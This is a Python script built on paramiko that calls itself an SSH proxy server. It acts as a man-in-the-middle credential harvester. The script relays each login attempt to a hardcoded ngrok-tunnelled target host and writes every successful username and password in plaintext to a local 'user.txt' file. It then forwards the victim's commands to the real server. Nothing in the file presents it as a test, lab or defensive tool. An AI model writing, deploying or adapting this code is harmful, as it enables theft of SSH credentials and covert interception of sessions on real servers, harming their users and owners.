import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
import select

from time import sleep 

import paramiko
from paramiko.util import b, u
from base64 import decodebytes

from argparse import ArgumentParser

parser = ArgumentParser(
    prog="ssh-server",
    description="This program runs an SSH proxy server"
)

parser.add_argument(
    '-p',
    '--port',
    type=int,
    required=True,
    help="The port to bind the proxy server to."
)

parser.add_argument(
    '--target-host',
    type=str,
    required=True,
    help="The target SSH server host."
)

parser.add_argument(
    '--target-port',
    type=int,
    default=22,
    help="The target SSH server port. Default is 22."
)

parser.add_argument(
    '--ssh-version',
    type=str,
    default="SSH-2.0-OpenSSH_8.2p1",
    help="The SSH version string. Default is 'SSH-2.0-OpenSSH_8.2p1'."
)

# args = parser.parse_args()

port = 8000# port = args.port
target_host = "2.tcp.eu.ngrok.io"# target_host = args.target_host
target_port = 19944# target_port = args.target_port
ssh_version = "ubuntu"# ssh_version = args.ssh_version



host_key = paramiko.RSAKey(filename=".ssh/test_rsa.key")




# setup logging
paramiko.util.log_to_file(f"log_file.log")

host_key = paramiko.RSAKey(filename=".ssh/test_rsa.key")
# host_key = paramiko.DSSKey(filename='test_dss.key')

print("Read key: " + u(hexlify(host_key.get_fingerprint())))


class Server(paramiko.ServerInterface):
    # 'data' is the output of base64.b64encode(key)
    # (using the "user_rsa_key" files)
    data = (
        b"AAAAB3NzaC1yc2EAAAABIwAAAIEAyO4it3fHlmGZWJaGrfeHOVY7RWO3P9M7hp"
        b"fAu7jJ2d7eothvfeuoRFtJwhUmZDluRdFyhFY/hFAh76PJKGAusIqIQKlkJxMC"
        b"KDqIexkgHAfID/6mqvmnSJf0b5W8v5h2pI/stOSwTQ+pxVhwJ9ctYDhRSlF0iT"
        b"UWT10hcuO4Ks8="
    )
    good_pub_key = paramiko.RSAKey(data=decodebytes(data))

    def __init__(self, client_transport, target_host, target_port):
        self.client_transport = client_transport
        self.target_host = target_host
        self.target_port = target_port
        self.target_transport = None

        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):


        # Establish a connection to the target SSH server
        try:
            self.target_transport = paramiko.Transport((self.target_host, self.target_port))
            self.target_transport.start_client()

            # Authenticate to the target server (you may customize the authentication method)
            self.target_transport.auth_password(username, password)

            with open('user.txt', 'a') as f:
                f.write(f"{username}: {password}\n")
            
            return paramiko.AUTH_SUCCESSFUL

        except Exception as e:
            print(f"Error connecting to target server: {e}")
            traceback.print_exc()
            return paramiko.AUTH_FAILED
    


    def check_auth_publickey(self, username, key):
        print("Auth attempt with key: " + u(hexlify(key.get_fingerprint())))
        if (username == "robey") and (key == self.good_pub_key):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_with_mic(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_keyex(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def enable_auth_gssapi(self):
        return True

    def get_allowed_auths(self, username):
        return "gssapi-keyex,gssapi-with-mic,password,publickey"

    def check_channel_pty_request(
        self, channel, term, width, height, pixelwidth, pixelheight, modes
    ):
        
        channel.close()
        self.event.set()

        return True
    
    def check_channel_shell_request(self, channel):
        self.event.set()
        return True
    
    def check_channel_exec_request(self, channel, command):
        try:
            res = self.exec_command(channel, command)
            channel.send_exit_status(res.returncode)
        except Exception as err:
            channel.send_exit_status(255)
        finally:
            self.event.set()
        return True


    
    def exec_command(self, channel, command):


        try:
            # Open a session on the target server
            target_session = self.target_transport.open_session()

            # Execute the command on the target server

            target_session.exec_command(command)


            # Wait for the command to complete and get the output
            output = target_session.makefile("rb", -1).read().decode("utf-8")

            exit_status = target_session.recv_exit_status()
            # Display the output on the console

            # Send the output back to the client
            channel.send(output)

            target_session.close()

            channel.send_exit_status(exit_status)

            channel.close()

            # Close the session on the target server
        
        except Exception as e:
            print(f"Error executing command on target server: {e}")
            traceback.print_exc()
    
DoGSSAPIKeyExchange = True

# now connect
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", port))
except Exception as e:
    print("*** Bind failed: " + str(e))
    traceback.print_exc()
    sys.exit(1)

try:
    sock.listen(100)
    print("Listening for connection ...")
    client, addr = sock.accept()
except Exception as e:
    print("*** Listen/accept failed: " + str(e))
    traceback.print_exc()
    sys.exit(1)

print("Got a connection!")

try:
    t = paramiko.Transport(client, gss_kex=DoGSSAPIKeyExchange)
    t.set_gss_host(socket.getfqdn(""))
    try:
        t.load_server_moduli()
    except:
        print("(Failed to load moduli -- gex will be unsupported.)")
        raise
    t.add_server_key(host_key)
    server = Server(t, target_host, target_port)
    try:
        t.start_server(server=server)
    except paramiko.SSHException:
        print("*** SSH negotiation failed.")
        sys.exit(1)

    server.event.wait(30)
    print("Authenticated!")

except Exception as e:
    print("*** Caught exception: " + str(e.__class__) + ": " + str(e))
    traceback.print_exc()
    try:
        t.close()
    except:
        pass
    sys.exit(1)